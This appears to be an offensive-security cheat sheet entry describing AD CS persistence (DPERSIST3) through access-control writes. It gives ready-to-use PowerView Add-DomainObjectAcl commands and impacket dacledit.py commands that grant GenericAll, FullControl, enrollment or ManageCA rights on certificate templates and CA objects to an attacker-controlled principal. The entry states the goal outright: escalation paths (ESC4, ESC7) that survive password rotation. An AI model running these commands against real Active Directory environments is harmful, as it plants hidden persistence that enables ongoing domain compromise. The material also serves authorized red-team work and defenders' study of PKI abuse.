---
technique: ADCS Persistence via Access Control Writes (DPERSIST3)
category: adcs-persistence
ace: GenericAll, GenericWrite, WriteDacl, WriteOwner, ManageCA, ManageCertificates
targets: Certificate Template, Certificate Authority, PKI Objects
protocols: LDAP, RPC
remote_capable: true
tags: adcs persistence dacl acl-abuse pki dpersist3 template-write
---

# ADCS Persistence via Access Control Writes (DPERSIST3)

With sufficient domain privileges an attacker can write permissive ACEs onto AD CS objects, certificate templates, the CA, or PKI containers, ensuring persistent access to escalation paths (ESC4, ESC5, ESC7) even after passwords are rotated. The actual exploitation then follows the corresponding movement technique.

## Windows

### PowerView: grant ACE on certificate template

#powershell #powerview #dacl #template

Write a permissive ACE (GenericAll) onto a certificate template for a controlled object; this creates an ESC4-style persistence path.

```powershell title:"DPERSIST3: grant GenericAll on cert template to controlled object"
Add-DomainObjectAcl -TargetIdentity "$template_name" -PrincipalIdentity "$controlled_object" -Rights All -TargetSearchBase "LDAP://CN=Configuration,DC=$dc_base" -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
var controlled_object
var dc_base
-->

### PowerView: grant enrollment rights on template

#powershell #powerview #dacl #enrollment

Grant Certificate-Enrollment extended right on a template to a controlled object so it can enroll even if not currently permitted.

```powershell title:"DPERSIST3: grant Certificate-Enrollment right on template"
Add-DomainObjectAcl -TargetIdentity "$template_name" -PrincipalIdentity "$controlled_object" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=$dc_base" -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
var controlled_object
var dc_base
-->

### PowerView: grant ManageCA on CA object

#powershell #powerview #dacl #manage-ca

Grant ManageCA right on the CA object to a controlled principal, enabling ESC7 exploitation on demand.

```powershell title:"DPERSIST3: grant ManageCA right on CA object"
Add-DomainObjectAcl -TargetIdentity "$ca_name" -PrincipalIdentity "$controlled_object" -Rights All -TargetSearchBase "LDAP://CN=Configuration,DC=$dc_base" -Verbose
```
<!-- cheat
import domain_ip
import users
var ca_name
var controlled_object
var dc_base
-->

## Linux

### dacledit.py: read current PKI ACEs

#impacket #dacl #enum

Read the current DACL on a PKI object to identify existing rights and confirm what needs to be added for persistence.

```sh title:"DPERSIST3: read current DACL on PKI object"
dacledit.py -action 'read' -principal "$controlled_object" -target "$target_object" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_object
var target_object
-->

### dacledit.py: write ACE on certificate template

#impacket #dacl #template-write

Write a FullControl ACE onto a certificate template for a controlled object; creates an always-available ESC4 escalation path.

```sh title:"DPERSIST3: write FullControl ACE on cert template via dacledit"
dacledit.py -action 'write' -rights 'FullControl' -principal "$controlled_object" -target "$template_name" -target-dn "$template_dn" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_object
var template_name
var template_dn
-->

### dacledit.py: write ACE on CA object

#impacket #dacl #manage-ca

Write ManageCA (or FullControl) onto the CA AD object for a controlled principal, creating a persistent ESC7 path.

```sh title:"DPERSIST3: write ManageCA ACE on CA object via dacledit"
dacledit.py -action 'write' -rights 'FullControl' -principal "$controlled_object" -target "$ca_dn" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_object
var ca_dn
-->
